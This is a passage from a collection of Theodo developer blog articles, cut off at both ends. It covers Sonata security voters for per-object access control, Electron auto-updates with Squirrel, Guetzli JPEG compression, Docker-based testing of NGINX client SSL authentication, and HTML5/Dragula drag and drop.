regressions you may be facing. But what makes it truly valuable is that it will also give you the root causes of these regressions, helping you to find the right actions to make sure that they won\u2019t happen again.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Miret\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tYou think that your entities need some finer access controls?\nChanging the url in your admin panel gives access to hidden forms?\nYou\u2019ve heard of ACL (Access Control List) but can\u2019t really see it as a feasible solution?\nIf so then you\u2019re just like me.\nI\u2019ve started working on a decently sized project with a backend powered by Sonata for the last few weeeks when I was tasked with granting edit access for certain admins to edit an entity they own and nothing else.\nProblem: My problem was that my security configuration was set to use Roles and the application itself was too big to switch to an ACLs approach.\nIf this is also your case then let me take you through my solutions.\nSome context for easier understanding\nLet\u2019s imagine a really simple application.\nYou are the president of a group managing hundreds of hotels all over the world each supervised by a different general manager.\nYour application is to be used both by you and each manager to store information about each of to store and manage information on each of those hotels.\nNow in this simplest form, the application need to have two entities. A User and a Hotel entity.\nBased on those requirement, you have two roles emerging:\n\n\nPresident: He should be able to list, show, edit, create, delete all Hotel object. He is basically the super admin.\n\n\nGeneral Manager: He should only be able to show and edit a single object. Only one Hotel.\nOne of those role will be given to a User object at creation. \n\n\nThis means that your security.yml has to look something like that:\n#app/config/security.yml\r\nROLE_GENERAL_MANAGER:\r\n    - ROLE_APP_ADMIN_HOTEL_SHOW\r\n    - ROLE_APP_ADMIN_HOTEL_EDIT\r\nROLE_SUPER_ADMIN: [ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH]\r\n\nThis gives too much right to the general manager.\nHe can easily acces any hotel information simply by changing the id that will appear in the url when he is accessing his own.\nWhat can we do to fix that?\nThe quick and dirty way\nThe part where the request is handled is the controller. So the first thing that comes to mind is to put the security logic there.\nFor that we need to understand that sonata uses a default CRUD controller for all of its admin classes. To implement our custom logic, we need to override this behaviour.\nWe start by extending the current controller in our bundle and implement our little security logic.\n// AppBundle/Controller/CRUDController.php\r\nclass CRUDController extends Controller\r\n{\r\n    /**\r\n     * Override the default editAction to only allow a General Manager to modify it's hotel\r\n     *\r\n     * @param $id\r\n     * @return Response\r\n     */\r\n    function editAction($id = null)\r\n    {\r\n        $user = $this->getUser();\r\n        // We assume here that the user has a function that return the Hotel he is managing\r\n        $hotel = $user->getHotel();\r\n        if ($user->hasRole('ROLE_GENERAL_MANAGER') and $id != $hotel->getId()) {\r\n            throw new AccessDeniedException();\r\n        }\r\n\r\n        return parent::editAction($id);\r\n    }\r\n}\r\n\nAnd then we add the controller as the one to be used by the Hotel admin.\napp.admin.hotel:\r\n    class: AppBundle\\Admin\\Hotel\r\n    tags:\r\n      - { name: sonata.admin, manager_type: orm, group: app }\r\n    arguments: [null, AppBundle\\Entity\\Hotel, AppBundle:CRUD]\r\n\nNow each time we try to edit an hotel we are not managing we will get the desired 403 error.\nThis way of doing things have two main disadvantages.\n\nWe don\u2019t have access to the object itself which could be useful to implement the ownership logic.\nOur security logic is present in the controller and not isolated.\n\nSecurity voters\nIf we look at the code in the sonata default CRUD controller we can notice those 3 lines of code checking for access on an instance of an entity.\nif (false === $this->admin->isGranted('EDIT', $object)) {\r\n    throw new AccessDeniedException();\r\n}\r\n\nBehind the scene, the isGranted function will start the voter security process of Symfony.\nIt will ask voters to decide if the current user can perform an action (here \u201cEDIT\u201d) on a certain object.\nThe voters will then judge and give out an answer.\nTo handle the case of multiple voters, it is useful to change the voting strategy to unanimous in the security.yml of the application.\nThis mode means that if any voter were to block access to an object then the access would be blocked even if another one were to allow access.\nThis allows for a finer security configuration by stacking voters on the same class of object based on different conditions.\nThis can be done by adding the following:\n# app/config/security.yml\r\nsecurity:\r\n  access_decision_manager:\r\n    strategy: unanimous\r\n\nTo get back to our hotel and it\u2019s security, to ban General Manager from modifying the hotel that do not belong to them, we need to define a security voter that supports \u201cEDIT\u201d and the Hotel class.\nTo do that, we need to extend the base Voter class and override two of its functions:\n// AppBundle\\Security\\HotelVoter.php\r\nclass HotelVoter extends Voter\r\n{\r\n    private $decisionManager;\r\n\r\n    public function __construct(AccessDecisionManagerInterface $decisionManager)\r\n    {\r\n        $this->decisionManager = $decisionManager;\r\n    }\r\n\r\n    protected function supports($attribute, $object)\r\n    {\r\n        // if the attribute isn't one we support, return false\r\n        if (!in_array($attribute, array(\"ROLE_APP_HOTEL_EDIT\"))) {\r\n            return false;\r\n        }\r\n\r\n        // only vote on Hotel objects inside this voter\r\n        if (!$object instanceof Hotel) {\r\n            return false;\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    protected function voteOnAttribute($attribute, $object, TokenInterface $token)\r\n    {\r\n        $user = $token->getUser();\r\n        if (!$user instanceof User) {\r\n            // the user must be logged in; if not, deny access\r\n            return false;\r\n        }\r\n\r\n        // ROLE_SUPER_ADMIN can do anything\r\n        if ($this->decisionManager->decide($token, array('ROLE_SUPER_ADMIN'))) {\r\n            return true;\r\n        }\r\n\r\n        return $user === $object->getManager();\r\n    }\r\n}\r\n\nAll that\u2019s left is to register the security voter as a service with the right tags:\n# AppBundle/Resource/voters.yml\r\napp.hotel_voter:\r\n  class: AppBundle\\Security\\HotelVoter\r\n    tags:\r\n      - name: security.voter\r\n\nNow when our crafty admin try to access any hotel he is not managing, he will be faced with desired 403 error \ud83d\ude09\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMicha\u00ebl Mollard\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIf you are a web developer, you would be amazed by the possibilities that a desktop application offers.\nJust give a look at the applications listed on electron website to have a quick glance of the infinite opportunities offered by such a technology.\nFew key features:\n\nAccess to the filesystem (see Atom)\nAccess to the webcam and mike (see Dischord)\nAccess to the command line interface within your app (see Hyper)\n\nThe problem is: How can you keep your speed and ease of reaching your users when you develop a desktop application ?\nMeet, Squirrel:\n\nThis little open-source framework aims to simplify installers for desktop softwares.\nWhen correctly set up, it enables your application to watch for new releases deployed on a server and to automatically update itself from the downloaded files.\nElectron auto-updater gives you an API to easily plug Squirrel to your application.\nThis sounds great, but when I recently tried to implement this feature for a Windows application, I had a hard time to understand how every pieces fit together.\nI will give you a quick glance of what I learned doing this, and explain how the update loop of a Squirrel application works.\nThe framework also works on Mac but the server implementation is slightly different:\nTo use Squirrel for Mac with Electron, check this article which helped me a lot when implementing the feature.\nPrepare your application to watch Squirrel\nOk to have a common base of code, let\u2019s say we will implement this feature on the Electron Quick Start and use it as an example.\nThis is a real minimal electron application and we will use only two files in it: Main.js and package.json.\nGit clone the repository and here we go.\nFirst thing to make your application listen to your Squirrel server, you\u2019ll need to use the electron.auto-updater API.\nAdd this script which is going to make your app watch for server updates.\nconst electron = require('electron');\r\nconst squirrelUrl = \"http://localhost:3333\";\r\n\r\nconst startAutoUpdater = (squirrelUrl) => {\r\n  // The Squirrel application will watch the provided URL\r\n  electron.autoUpdater.setFeedURL(`${squirrelUrl}/win64/`);\r\n\r\n  // Display a success message on successful update\r\n  electron.autoUpdater.addListener(\"update-downloaded\", (event, releaseNotes, releaseName) => {\r\n    electron.dialog.showMessageBox({\"message\": `The release ${releaseName} has been downloaded`});\r\n  });\r\n\r\n  // Display an error message on update error\r\n  electron.autoUpdater.addListener(\"error\", (error) => {\r\n    electron.dialog.showMessageBox({\"message\": \"Auto updater error: \" + error});\r\n  });\r\n\r\n  // tell squirrel to check for updates\r\n  electron.autoUpdater.checkForUpdates();\r\n}\r\n\r\napp.on('ready', function (){\r\n  // Add this condition to avoid error when running your application locally\r\n  if (process.env.NODE_ENV !== \"dev\") startAutoUpdater(squirrelUrl)\r\n});\r\n\nGreat, now your application will listen to the provided feedUrl. But as it is not wrapped yet into the Squirrel framework, you will have an error thrown when using it in dev mode.\nTo avoid this inconvenience, use the following command as your npm start in package.json:\nNODE_ENV=dev electron .\r\n\nWhen launched for the first time, Squirrel will need to restart or it will throw an error.\nTo handle this, add the following to your Main.js:\nconst handleSquirrelEvent = () => {\r\n  if (process.argv.length === 1) {\r\n    return false;\r\n  }\r\n\r\n  const squirrelEvent = process.argv[1];\r\n  switch (squirrelEvent) {\r\n    case '--squirrel-install':\r\n    case '--squirrel-updated':\r\n    case '--squirrel-uninstall':\r\n      setTimeout(app.quit, 1000);\r\n      return true;\r\n\r\n    case '--squirrel-obsolete':\r\n      app.quit();\r\n      return true;\r\n  }\r\n}\r\n\r\nif (handleSquirrelEvent()) {\r\n  // squirrel event handled and app will exit in 1000ms, so don't do anything else\r\n  return;\r\n}\r\n\nThis script will read the option of the squirrel event when launching your application, giving you the ability to execute scripts at specific moments of the installation.\nIn this case, it will restart the application when installing it, updating it or uninstalling it.\nYou can as well do thing like add an shortcut icon on desktop when installing the application and remove it when uninstalling (check this documentation).\nYour app is now ready to be packed \nLet\u2019s release our app!\nOkay you have your wonderful app ready to be released!\nWe now need to package it, using for example the electron-packager.\nInstall the package :\nnpm install electron-packager --save-dev\r\n\nAnd run this command to package your release :\n./node_modules/.bin/electron-packager . MyAwesomeApp --platform=win32 --arch=x64 --out=release/package\r\n\nInside release/package/MyAwesomeApp-win32-x64 folder, you now have a MyAwesomeApp.exe file that you can run on Windows! Here is your first release of your wonderful app.\nNow wrap it with Squirrel\nWe will now have to create a Windows installer for it that includes Squirrel.\nThe Electron team released lately the electron-winstaller package that does the job pretty well.\nInstall the package with:\nnpm install electron-winstaller --save-dev\r\n\nThen create a build.js script like this one:\nvar electronInstaller = require('electron-winstaller');\r\n\r\nresultPromise = electronInstaller.createWindowsInstaller({\r\n    appDirectory: './release/MyAwesomeApp-win32-x64',\r\n    outputDirectory: './release/installer',\r\n    authors: 'Me',\r\n    exe: 'MyAwesomeApp.exe'\r\n  });\r\n\r\nresultPromise.then(() => console.log(\"It worked!\"), (e) => console.log(`No dice: ${e.message}`));\r\n\nThis file will tell Squirrel all it needs to know to create you an installer:\n\nWhere your app release is located\nWhere to put the new release\nWhere the entrypoint of your app is\n\nExecute this script with node:\nnode ./build.js\r\n\nGo and check in release/installer, you now have a ready to use Squirrel server!\nIt should look like this:\ninstaller\r\n\u251c\u2500 RELEASES\r\n\u251c\u2500 MyAwesomeApp-0.0.1-full.nupkg\r\n\u2514\u2500 Setup.exe\r\n\nDistribute your application\nThe only thing you need now is to create a file server to serve this folder on internet. You can for example serve it with php:\nphp -s localhost:3333\r\n\nVery simply, you can now distribute your application to your users with the Setup.exe file.\nGo to http://localhost:3333/Setup.exe, this will download the Setup.exe file which will install MyAwesomeApp wrapped with Squirrel on your computer.\nRun the Setup.exe file, and the application should be installed in C:\\Users\\Me\\AppData\\MyAwesomeApp\\.\nTo run it, launch the MyAwesome.exe file.\nYou can as well create a shortcut on your desktop for later use.\nTime to build a new release\nLet\u2019s now try to build a new version of our app and to release it!\nFirst things first, let\u2019s create a new feature:\nalert('OMG such new feature!!');\r\n\nNow bump the version from package.json.\nThis is compulsory if you want to create a new package, otherwise the previous one will be overwritten:\nnpm version patch\r\n\nThe 0.0.2 version of our app is ready!\nRedo the process to build a new package.\nTo simplify this, we can write npm commands:\n\"scripts\": {\r\n  \"build:package\": \"electron-packager . MyAwesomeApp --platform=win32 --arch=x64 --out=release/package\",\r\n  \"build:winstaller\": \"node ./build.js\",\r\n  \"build\": \"npm run build:package && npm run build:winstaller\"\r\n}\r\n\nRun then:\nnpm run build\r\n\nCheck out the releases/installer, a new package appeared!\nYour Squirrel server should now looks like this:\ninstaller\r\n\u251c\u2500 RELEASES\r\n\u251c\u2500 MyAwesomeApp-0.0.1-full.nupkg\r\n\u251c\u2500 MyAwesomeApp-0.0.2-diff.nupkg\r\n\u251c\u2500 MyAwesomeApp-0.0.2-full.nupkg\r\n\u2514\u2500 Setup.exe\r\n\nWhen the magic happens\nOpen now your application: you can use the shortcut that you have created earlier or go to C:\\Users\\Me\\AppData\\MyAwesomeApp\\.\nWait for around 20sec, and your app should reload and you will see your new wonderful feature appears!\n\nWhat happened?\nLet\u2019s give a look at how the Squirrel app has been installed: the location should be C:\\Users\\Me\\AppData\\MyAwesomeApp\\, where Me is your Windows username.\nThe application is bundled as follows:\nMyAwesomeApp\r\n\u2502\r\n\u251c\u2500 app-0.0.1                // This contains the packaged electron application version 0.0.1\r\n\u2502  \u251c\u2500 MyAwesomeApp.exe\r\n|  \u251c\u2500 squirrel.exe\r\n|  ...\r\n\u2502  \u2514\u2500 resources\r\n\u2502     \u251c\u2500 app.asar           // This contains the source code of electron application version 0.0.1\r\n\u2502     \u2514\u2500 electron.asar\r\n\u2502\r\n\u251c\u2500 packages                 // This contains the packages downloaded from Squirrel server\r\n\u2502  \u251c\u2500 RELEASES\r\n\u2502  \u251c\u2500 MyAwesomeApp-0.0.1-full.nupkg  \r\n\u2502  ...\r\n\u2502\r\n\u251c\u2500 MyAwesomeApp.exe            // This will launch Update.exe and then the latest app installed\r\n\u251c\u2500 SquirrelSetup.log\r\n\u2514\u2500 Update.exe               // This is the Squirrel program used to Update application\r\n\nSo what\u2019s happening when you click on the shortcut?\n\nThe entry point is /MyAwesomeApp.exe.\nThis will launch the latest local version of the application (here 0.0.1).\nThe entry point of the application is main.js.\nIt contains the startAutoUpdater function we added earlier which configures the squirrel updater through the electron.autoupdater API.\nThis will call /Update.exe (which is the main Squirrel program) to check for new releases.\nUpdate.exe checks at the feedUrl set and download the remote RELEASES file.\nThen, it compares this downloaded file to the local /packages/RELEASES file.\nIf there is a new version, it downloads it and unpack it into an app-0.0.2 folder.\nThen the \u2018update-downloaded\u2019 event is triggered and the alert appears in MyAwesomeApp.\nWhen launching again the MyAwesomeApp, the previous version is cleansed and the application is updated.\n\nThe easy part\nTo set up continuous deployment, deploy a new release on your server and Squirrel will do the rest!\nYou now know pretty everything about the Squirrel.Windows framework!\nTo dive deeper into the possibilities that it offers, open a terminal on Windows and run ./Update.exe into your project folder to display available documentation.\nHope this helps, don\u2019t hesitate to give feedbacks!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Ng\u00f4-Ma\u00ef\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis article has been translated in russian\u00a0here.\nAs you may already know, the average web page is now heavier than Doom.\nOne of the reasons for this increase is the weight of images, and the need to support higher resolutions.\nGoogle to the Rescue\nGoogle just published a new JPEG compression algorithm: Guetzli.\nThe main idea of this algorithm is to focus on keeping the details the human eye is able to recognize easily while skipping details the eye is not able to notice.\nI am no specialist, but the intended result is to get an image which percived quality is the same, but with a reduced filesize.\nThis is not a new image format, but a new way to compress JPEG images\nWhich means that there is no need for a custom image reader, the images are displayed by anything that already renders JPEGs.\nGuetzli in Real Life\nOn one of my projects, we had an image-heavy homepage (about 30Mb for the homepage alone, 27 of those only for the images).\nI decided to give Guetzli a try, to convince our product owner and our designer that the quality loss would be acceptable, I tried this new algorithm on one of the high-res image we were not using (a 8574\u00d75715, 22MB JPEG).\nIt crashed.\nAccording to google (and my experiences confirms the figures), Guetzli takes about 300MB RAM per 1Mpix of image (so about 15GB for the image I had) and I did not have that memory available at the time (half a dozen node servers, a couple docker containers, chromium and a couple electron instances were taking enough space to get my computer under the requirement).\nI retried after cleaning up every non-vital process, Guetzli took 12GB of RAM but succeeded.\nGoogle also states that it take about one minute per MPix for Guetzli to process an image, which is about the time it took me (a bit above 40minutes).\nThe resulting image weighted under 7MB (from 22MB), and I could not determine by looking at them which was the compressed one (our designer could, but admitted that the difference was \u201cincredibly small\u201d).\n6.9M    home-guetzli.jpg\r\n22M home-raw.jpg\r\n\nThat compression was made using Guetzli\u2019s default quality setting (which goes from 84 to 100, to get under 84 you would need to compile and use a version where you change the minimal value).\nMore Tests and Some Successes\nI then decided to try different quality settings for that image (wrote a very simple script to do that without having to relaunch the process every 40 minutes, and to be able to do it during my sleep).\nThe results are here (and it seems that Guetzli\u2019s default quality factor is 95).\n6.9M    ./home-guetzli.jpg\r\n22M ./home-raw.jpg\r\n3.0M    ./home-raw.jpg.guetzli84.jpg\r\n3.4M    ./home-raw.jpg.guetzli87.jpg\r\n4.2M    ./home-raw.jpg.guetzli90.jpg\r\n5.5M    ./home-raw.jpg.guetzli93.jpg\r\n8.8M    ./home-raw.jpg.guetzli96.jpg\r\n18M ./home-raw.jpg.guetzli99.jpg\r\n\nBoth the product owner and the designer agreed to go with the 84 quality factor. I then converted all our assets and we went from 30MB to less than 8MB for the homepage (3MB of those being the CSS/script).\nShould be noted that there was not any form of image compression before.\nCaveats\nThe installation of Guetzli on my machine was painless (someone set up an AUR package containing Guetzli on archlinux, thanks a lot to whoever did that), and running it is straightfoward (as long as you have enough RAM).\nThere seems to be a brew package (for macOs users), but I did not test it.\nGuetzli requires a lot of RAM and CPU time for huge images (a lot being relative, i.e. don\u2019t expect to be able to do anything while it\u2019s running).\nIf RAM is not your bottleneck you might even want to consider to run multiples instances of Guetzli in parallel on different images, as it is (as of this writting) only taking one core.\nBeing a JPEG encoder, it cannot output PNGs (so no transparency).\nBut it can convert and compress your PNGs.\nIt\u2019s efficiency is tied to the initial quality of the picture: I noticed the compression ratio going from 7x on the largest image to 2x on small images.\nThe quality loss was also more visible on those small images.\nOn a few cases I also witnessed a loss of color saturation (which was deemed acceptable in my case).\nTL;DR\nGive Guetzli a try, it might give you unacceptable results (especially with low quality), but it might save you a few MBs on your website.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCl\u00e9ment Hannicq\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tYou can follow this article with the related Github repository.\nIntroduction\nDuring a mission I did at Theodo, I worked on a security issue about controlling the access to an application.\nIt included changing NGINX and Apache configurations.\nWhen the issue was discovered, we tried to fix it directly on the production environment and we failed.\nIf you\u2019re trying to make a change directly on the production environment, it probably won\u2019t work and will break the application. You need to test it first.\nWhat is my problem?\nI want to restrict access to my NGINX server so that the client can\u2019t access the NGINX server directly.\n\nTo solve this problem, I want to simulate the Proxy and the NGINX servers. I can either:\n\nUse several servers in a cluster\nUse virtual machines locally\nUse Docker locally\n\nThe cluster solution is very bad because it won\u2019t work locally, and it costs money. The second solution is better but virtual machines are not easy to configure as a local network, and they take a lot of computing ressources, as the whole OS is running.\nIn contrast, Docker is a convenient tool to run several containers (which take a small computing ressource) and simulate a network of independent servers.\nHow to setup my containers using docker-compose?\nThis part requires docker-compose. It is a tool that creates several Docker containers with one command.\nCreate a docker-compose.yml file containing:\n # docker-compose.yml\r\n\r\nversion: '2'\r\n\r\nservices:\r\n\r\n  app:\r\n    image: nginx:latest\r\n    container_name: app\r\n\r\n  proxy:\r\n    image: httpd:latest\r\n    container_name: proxy\r\n    depends_on:\r\n     - app\r\n\nThe depends_on block means that the app will start before proxy.\nHow to link the ports between my container and my computer?\nAdd some ports:\n# docker-compose.yml\r\n\r\nservices:\r\n\r\n  app:\r\n    ...\r\n    ports:\r\n      - \"443:443\"\r\n    ...\r\n\r\n  proxy:\r\n    ...\r\n    ports:\r\n      - \"9443:443\"\r\n    ...\r\n\nIt links the ports like this: local-port:container-port\nHow to watch logs on local files and enable debug?\nLink the log files in your volumes:\n# docker-compose.yml\r\n\r\nservices:\r\n\r\n  app:\r\n    ...\r\n    volumes:\r\n      - ./nginx/logs:/usr/share/nginx/logs\r\n    ...\r\n\r\n  proxy:\r\n    ...\r\n    volumes:\r\n     - ./proxy/apache2/logs:/usr/local/apache2/logs\r\n    ...\r\n\nIt links directories or single files like this:\nlocal/path:container/path\nYou can now monitor the logs in your editor at proxy/apache2/logs and nginx/logs, or using tail -f.\nSet NGINX in debug mode using a custom command:\n# docker-compose.yml\r\n\r\nservices:\r\n\r\n  app:\r\n    ...\r\n    command: [nginx-debug, -g, daemon off;]\r\n    ...\r\n\nThis will launch the nginx-debug service instead of the nginx service when you start this container.\nHow to link the configuration files between my container and my computer?\nAdd some volumes:\n# docker-compose.yml\r\n\r\nservices:\r\n\r\n  app:\r\n    ...\r\n    volumes:\r\n      - ./nginx/nginx:/etc/nginx:ro\r\n      - ./nginx/index.html:/usr/share/nginx/coucou/index.html:ro\r\n    ...\r\n\r\n  proxy:\r\n    ...\r\n    volumes:\r\n      - ./proxy/conf/httpd.conf:/usr/local/apache2/conf/httpd.conf:ro\r\n      - ./proxy/apache2/conf/sites-available:/usr/local/apache2/conf/sites-available:ro\r\n    ...\r\n\nThe :ro at the end means read only for the container. In other words, you can only edit this file/directory outside the container.\nHow to solve my security problem?\nThe solution to my problem is to enable SSL Client Authentication on the NGINX server, in order to allow only the requests coming from the proxy server:\n\nUsing the \u201cfail & retry\u201d process, I found the correct configuration:\n\nModify the config files in proxy/conf/ and nginx/nginx/.\nLaunch the containers with docker-compose up.\nTest if it works. If needed, look at the log files.\nStop the containers with Ctrl + C and start over.\n\nThe important part of the configuration I discovered is the following:\n# proxy/apache2/conf/sites-available/appli.conf\r\n...\r\nSSLProxyEngine on\r\nSSLProxyCheckPeerName off\r\nSSLProxyMachineCertificateFile \"/usr/local/apache2/ssl/proxy.pem\" # sends the client certificate\r\n...\r\n\n# nginx/nginx/conf.d/default.conf\r\n\r\nserver {\r\n    ...\r\n    # verifies the client certificate\r\n\r\n    ssl_verify_client on;\r\n    ssl_client_certificate /var/www/ca.crt; # Trusted CAs\r\n\r\n    # verifies the client CN.\r\n\r\n    # use $ssl_client_s_dn for nginx < 1.6:\r\n    if ($ssl_client_s_dn_legacy != \"/C=FR/ST=France/L=Paris/O=Theodo/OU=Blog/CN=proxy/emailAddress=samuelb@theodo.fr\") {\r\n        return 403;\r\n    }\r\n    ...\r\n}\r\n\nYou can reproduce it by cloning my repo: Client-SSL-Authentication-With-Docker and running docker-compose up.\nIf you request directly the NGINX server (https://localhost/), you get a 400 error, but if you request the Proxy server (https://localhost:9443/), you can access the sensitive data.\nConclusion\nWhen repairing this security vulnerability using Docker, I was able to:\n\ngive more visibility to my client on how I was handling this network problem, because I had a plan to break the problem.\nreassure my client because there was no danger for the production environment.\nincrease my client\u2019s statisfaction because I solved the problem quickly.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tSamuel Briole\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tDrag & drop has become such a common feature on the web that people think it\u2019s a no-brainer for developers. A few months back, a client told me: \u201cHow can it be that hard, it\u2019s all over the internet!\u201d and at that time I had no idea how to implement it. If you want to learn how it\u2019s done, you are in the right place. Keep calm and read along!\nChoose your technical approach\nThere are plenty open-source drag & drop libraries on the Internet. My advice is not to rush into the first library you find! You might spend a few days trying to tweak it only to realize it does not meet your project requirements.\nThat\u2019s why the first part of this article is dedicated to drag & drop with HTML5, a sturdy and customizable solution which does not require you to install any external library. In the second part I will look into Dragula, a straightforward solution for reordering blocks on a web page, which comes with nice style features.\nThe demos are available here:\n\nDrag & Drop with HTML5\nDrag & Drop with Dragula and React\nDrag & Drop with Dragula and Angular 1\n\nA Sturdy Solution: Drag & Drop with HTML5 Attributes\nSay you have two elements in your view: a draggable item and a drop zone.\n<div> DRAGGABLE ITEM </div>\r\n<div> DROP ZONE </div>\r\n\nTo make the first element draggable, add the draggable attribute:\n<div draggable=\"true\"> DRAGGABLE ITEM </div>\r\n\nBy default nothing can be dropped into an element so the drop zone is not operational yet. Use the ondragover attribute to enable this behaviour:\n<div ondragover=\"allowDrop(event)\"> DROP ZONE </div>\r\n<script>\r\n  allowDrop = (event) => {\r\n    event.preventDefault();\r\n  }\r\n</script>\r\n\nUse the ondrop attribute to decide what to do when the item is dropped on the zone. In the example below I log a message in the console:\n<div ondragover=\"allowDrop(event)\" ondrop=\"handleDrop()\"> DROP ZONE </div>\r\n<script>\r\n  allowDrop = (event) => {\r\n    event.preventDefault();\r\n  }\r\n  handleDrop = () => {\r\n    console.log('You dropped something!');\r\n  }\r\n</script>\r\n\nThat\u2019s it! You now have basic drag & drop on your web page!\nYou can now add some extra features with the ondragstart, ondragenter and ondragleave attributes. For instance, a nice feature with ondragenter and ondragleave would be to highlight the drop zone by adding and removing a custom css class of your choice (named dragging-over in the example below). Here is the full code:\n<div\r\n  draggable=\"true\"\r\n  ondragstart=\"handleDragStart()\">\r\n  DRAGGABLE ITEM\r\n</div>\r\n<div\r\n  ondragover=\"allowDrop(event)\"\r\n  ondrop=\"handleDrop()\"\r\n  ondragenter=\"colorize(this)\"\r\n  ondragleave=\"uncolorize(this)\">\r\n  DROP ZONE\r\n</div>\r\n<script>\r\n  allowDrop = (event) => {\r\n    event.preventDefault();\r\n  }\r\n  handleDragStart = () => {\r\n    console.log('Started dragging');\r\n  }\r\n  colorize = (element) => {\r\n    console.log('Entered the drop zone');\r\n    element.classList.add('dragging-over');\r\n  }\r\n  uncolorize = (element) => {\r\n    console.log('Left the drop zone');\r\n    element.classList.remove('dragging-over');\r\n  }\r\n  handleDrop = () => {\r\n    console.log('You dropped something!');\r\n  }\r\n</script>\r\n\nSometimes you don\u2019t need to implement your own custom solution and a turnkey library can fit your project needs. Don\u2019t reinvent the wheel if you don\u2019t need to!\nReordering the DOM: introducing the Dragula library\nDragula lets you reorder elements of the DOM. In the following example I display the word \u201cSMILE\u201d and let the user move the letters around to form anagrams like \u201cSLIME\u201d or \u201cMILES\u201d.\nThe demo is coded with React but Dragula bridges are also available for Angular 1 and Angular 2.\nAs I am not using Webpack or any other tool to require Dragula, I use a <script> tag in the index.html file:\n<html>\r\n  <head>\r\n    <meta charset=\"UTF-8\" />\r\n    <title>Drag & Drop - Dragula for React</title>\r\n    <link rel=\"stylesheet\" href=\"style.css\">\r\n    <link href=\"bower_components/react-dragula/dist/dragula.min.css\" rel=\"stylesheet\" type=\"text/css\">\r\n    <!-- Do not forget to import the Dragula style sheet -->\r\n  </head>\r\n  <body>\r\n    <div id=\"anagram\"></div>\r\n    <script src=\"https://unpkg.com/react@latest/dist/react.js\"></script>\r\n    <script src=\"https://unpkg.com/react-dom@latest/dist/react-dom.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6.15.0/babel.min.js\"></script>\r\n    <!-- I use Babel to transform JSX to javascript -->\r\n    <script src=\"bower_components/react-dragula/dist/react-dragula.js\"></script>\r\n    <!-- I previously installed react-dragula with Bower -->\r\n  </body>\r\n</html>\r\n\nNow let\u2019s create a React component named Anagram and mount it on the div with the \u201canagram\u201d id. Add a <script> tag to the body:\n<script type=\"text/babel\">\r\n  class Anagram extends React.Component {\r\n    render() {\r\n      return <div className=\"anagram-container\">\r\n          <div className=\"letter-outter-container\">\r\n            <div className=\"letter-container\">S</div>\r\n          </div>\r\n          <div className=\"letter-outter-container\">\r\n            <div className=\"letter-container\">M</div>\r\n          </div>\r\n          <div className=\"letter-outter-container\">\r\n            <div className=\"letter-container\">I</div>\r\n          </div>\r\n          <div className=\"letter-outter-container\">\r\n            <div className=\"letter-container\">L</div>\r\n          </div>\r\n          <div className=\"letter-outter-container\">\r\n            <div className=\"letter-container\">E</div>\r\n          </div>\r\n      </div>;\r\n    }\r\n  };\r\n  ReactDOM.render(<Anagram/>, document.getElementById('anagram'));\r\n</script>\r\n\nThe css classes letter-container and letter-outter-container are up to you. I wrapped the letter-container divs in order to get some spacing within letters without using margins because they generate glitches with Dragula. At this point I have something like this:\n\n\u00a0\n\u00a0\n\u00a0\n\u00a0\n\u00a0\nFinally, add the componentDidMount lifecycle method in the component and apply Dragula to the created DOM node:\ncomponentDidMount() {\r\n  var container = ReactDOM.findDOMNode(this);\r\n  